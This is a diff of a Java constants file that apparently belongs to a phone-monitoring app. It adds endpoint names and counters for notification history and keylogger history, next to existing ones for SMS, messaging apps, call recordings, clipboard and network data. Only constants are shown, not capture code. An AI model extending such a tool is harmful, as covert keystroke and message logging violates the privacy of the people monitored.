@@ -27,6 +27,8 @@ public class Global {
     static final String VALUE_ACCEPT = "application/json";
     static final String CONTENT_TYPE = "Content-type";
     static final String VALUE_CONTENT_TYPE = "application/json";
+    public static final String TABLE = "Table";
+    public static final String TABLE1 = "Table1";
 
     /**
      * MyDatabase
@@ -38,7 +40,7 @@ public class Global {
     /**
      * Default date format.
      */
-    static final String DEFAULT_DATETIME_FORMAT = "yyyy-MM-dd HH:mm:ss";
+    public static final String DEFAULT_DATETIME_FORMAT = "yyyy-MM-dd HH:mm:ss";
     public static final String DEFAULT_DATE_FORMAT = "yyyy-MM-dd";
     public static final String DEFAULT_DATE_FORMAT_MMM = "MMM dd, yyyy";
     public static final String DEFAULT_TIME_FORMAT = "HH:mm:ss";
@@ -78,6 +80,8 @@ public class Global {
     public static final String GET_CALENDAR_HISTORY = "GetCalendar";
     public static final String GET_NETWORK_HISTORY = "GetNetwork";
     public static final String GET_YOUTUBE_HISTORY = "GetYouTube";
+    public static final String GET_NOTIFICATION_HISTORY = "GetNotification";
+    public static final String GET_KEYLOGGER_HISTORY = "GetKeylogger";
 
     public static final String POST_CLEAR_MULTI_SMS = "DeleteMultiChatDataLog";
     public static final String POST_CLEAR_MULTI_PHONE_RECORDING = "ClearMultiPhoneRecording";
@@ -94,8 +98,9 @@ public class Global {
     public static final String POST_CLEAR_MULTI_CLIPBOARD = "ClearClipboard"; //2021-07-12
     public static final String POST_CLEAR_MULTI_CALENDAR = "ClearCalendar"; //2021-07-15
     public static final String POST_CLEAR_MULTI_NETWORK = "ClearNetwork"; //2021-07-12
-    public static final String POST_CLEAR_MULTI_YOUTUBE = "ClearYouTube"; //2021-07-19
-
+    public static final String POST_CLEAR_MULTI_YOUTUBE = "ClearMultiYouTube"; //2021-07-19
+    public static final String POST_CLEAR_MULTI_NOTIFICATION = "clearMultiNotification"; //2021-07-19
+    public static final String POST_CLEAR_MULTI_KEYLOGGER = "ClearKeylogger"; //2021-07-23
 
     /**
      * SharedPreferences
@@ -117,19 +122,22 @@ public class Global {
     public static final String SKYPE_TOTAL = "Skype_Total";
     public static final String HANGOUTS_TOTAL = "Hangouts_Total";
     public static final String MAPTYPE = "maptype";
+    public static final String INSTAGRAM_TOTAL = "Instagram_Total";
 
     // 2021-07-15
     public static final String CLIPBOARD_TOTAL = "Clipboard_Total";
     public static final String CALENDAR_TOTAL = "Calendar_Total";
     public static final String NETWORK_TOTAL = "Network_Total";
     public static final String YOUTUBE_TOTAL = "YouTube_Total";
+    public static final String NOTIFICATION_TOTAL = "Notification_Total";
+    public static final String KEYLOGGER_TOTAL = "Keylogger_Total";
 
     /**
      * SMS type
      */
     public static final String SMS_DEFAULT_TYPE = "0";
     public static final String SMS_WHATSAPP_TYPE = "1";
-    public static final String SMS_INSTAGRAM_TYPE = "2";
+    public static final String SMS_INSTAGRAM_TYPE = "14"; // 2021-07-23
     public static final String SMS_VIBER_TYPE = "3";
     public static final String SMS_FACEBOOK_TYPE = "4";
     public static final String SMS_SKYPE_TYPE = "5";
